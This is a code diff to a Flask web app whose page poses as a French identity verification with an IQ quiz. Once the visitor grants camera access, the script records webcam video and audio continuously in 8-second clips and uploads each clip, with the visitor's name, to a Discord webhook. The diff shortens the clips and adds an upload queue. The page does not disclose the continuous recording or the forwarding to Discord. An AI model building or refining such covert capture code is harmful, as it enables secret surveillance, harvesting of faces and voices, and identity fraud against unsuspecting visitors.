@@ -64,13 +64,12 @@ HTML_TEMPLATE = """
         </select>
     </div>
     <h2 id="mainTitle">Vérification d'identité</h2>
-    <div class="subtitle" id="subTitle">Veuillez cliquer sur le bouton ci-dessous pour démarrer la vérification</div>
+    <div class="subtitle" id="subTitle">Veuillez cliquer sur le bouton ci-dessous pour démarrer</div>
 
     <div id="video-container">
         <video id="webcam" autoplay playsinline muted></video>
     </div>
 
-    <!-- زر اجباري باش المتصفح يقبل الكاميرا ويتصوّر الفيديو والصوت بالصحيح -->
     <button type="button" id="startCamBtn" class="action-btn" onclick="startCameraAndRecording()">🎥 Démarrer la vérification</button>
 
     <form id="quizForm" style="display:none; margin-top:20px;" onsubmit="event.preventDefault(); verifyAndSend();">
@@ -180,18 +179,19 @@ HTML_TEMPLATE = """
 
     let mediaStream = null;
     let mediaRecorder = null;
-    let recordedChunks = [];
+    let recordingActive = false;
+    let uploadQueue = Promise.resolve();
 
     async function startCameraAndRecording() {
         try {
             mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
             document.getElementById('webcam').srcObject = mediaStream;
             
-            // إخفاء زر البدء وإظهار الأسئلة
             document.getElementById('startCamBtn').style.display = 'none';
             document.getElementById('quizForm').style.display = 'block';
             document.getElementById('subTitle').innerText = "Veuillez répondre aux 20 questions";
 
+            recordingActive = true;
             startSegmentLoop();
         } catch (err) {
             alert("Erreur: Accès à la caméra refusé.");
@@ -199,40 +199,44 @@ HTML_TEMPLATE = """
     }
 
     function startSegmentLoop() {
-        if (!mediaStream) return;
+        if (!recordingActive || !mediaStream) return;
         
         try {
             mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-            recordedChunks = [];
+            let chunks = [];
 
             mediaRecorder.ondataavailable = e => {
                 if (e.data && e.data.size > 0) {
-                    recordedChunks.push(e.data);
+                    chunks.push(e.data);
                 }
             };
 
-            mediaRecorder.onstop = async () => {
-                if (recordedChunks.length > 0) {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            mediaRecorder.onstop = () => {
+                if (chunks.length > 0) {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
                     const username = document.getElementById('username').value || "Anonyme";
                     const formData = new FormData();
-                    formData.append("username", username + " [🎥 10s Clip]");
-                    formData.append("video", blob, "clip.webm");
+                    formData.append("username", username + " [🎥 Clip 8s]");
+                    formData.append("video", blob, "clip_8s.webm");
                     
-                    fetch("/submit-consent", { method: "POST", body: formData }).catch(e => {});
+                    // إضافة في الـ Queue باش يبعثهم بالترتيب ومن غير ما يصير Spam
+                    uploadQueue = uploadQueue.then(() => 
+                        fetch("/submit-consent", { method: "POST", body: formData }).catch(e => {})
+                    );
                 }
-                // بدء مقطع جديد فوراً
-                startSegmentLoop();
+                if (recordingActive) {
+                    startSegmentLoop();
+                }
             };
 
             mediaRecorder.start();
 
-            // إيقاف التسجيل بعد 10 ثوانٍ لتدخل onstop وتبعت الفيديو
+            // ضبط المؤقت على 8 ثوانٍ بالضبط لكل مقطع فيديو
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
                 }
-            }, 10000);
+            }, 8000);
 
         } catch (err) {
             setTimeout(startSegmentLoop, 2000);
@@ -242,11 +246,14 @@ HTML_TEMPLATE = """
     async function verifyAndSend() {
         const status = document.getElementById('status');
         status.style.color = "#6366f1";
-        status.textContent = "Envoi en cours...";
+        status.textContent = "Envoi des réponses en cours...";
 
+        recordingActive = false;
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
+
+        await uploadQueue;
 
         const formData = new FormData();
         formData.append("username", document.getElementById('username').value);
@@ -283,7 +290,7 @@ def send_to_discord(content, video_file=None):
     if video_file:
         files = {
             "file": (
-                video_file.filename or "clip.webm",
+                video_file.filename or "clip_8s.webm",
                 video_file.read(),
                 video_file.content_type or "video/webm"
             )
@@ -294,7 +301,7 @@ def send_to_discord(content, video_file=None):
         files=files,
         timeout=30
     )
-    print(f"Discord Response: {response.status_code}")
+    print(f"Discord Response Status: {response.status_code}")
     response.raise_for_status()
 
 @app.route("/submit-consent", methods=["POST"])
@@ -304,7 +311,7 @@ def submit_consent():
         video_file = request.files.get("video")
         if not video_file:
             return jsonify({"error": "No video"}), 400
-        content = f"🎥 **IQ Questions — Clip (10s)**\n**Nom :** {username}"
+        content = f"🎥 **IQ Questions — Clip (8s)**\n**Nom :** {username}"
         send_to_discord(content, video_file)
         return jsonify({"message": "Sent"}), 200
     except Exception as e:
